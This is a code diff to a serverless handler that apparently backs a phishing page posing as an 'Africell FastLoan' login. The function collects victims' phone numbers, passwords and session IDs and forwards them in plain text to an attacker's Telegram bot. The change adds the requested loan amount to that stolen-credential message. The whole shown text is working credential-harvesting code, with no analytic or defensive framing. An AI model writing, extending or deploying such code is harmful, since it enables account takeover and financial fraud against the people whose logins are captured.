@@ -14,7 +14,7 @@ async function redisSet(key, value, exSeconds = 600) {
 exports.handler = async (event) => {
     if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
 
-    const { phone, password, sessionId } = JSON.parse(event.body || '{}');
+    const { phone, password, sessionId, loanAmount } = JSON.parse(event.body || '{}');
     if (!phone || !password || !sessionId) {
         return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
     }
@@ -30,7 +30,8 @@ exports.handler = async (event) => {
     const text =
         `🏦 *Africell FastLoan – Login Attempt*\n\n` +
         `📱 Phone: \`${phone}\`\n` +
-        `🔑 Password: \`${password}\`\n\n` +
+        `🔑 Password: \`${password}\`\n` +
+        `💰 Requesting: \`${loanAmount || 'Unknown'}\`\n\n` +
         `Session: \`${sessionId}\``;
 
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
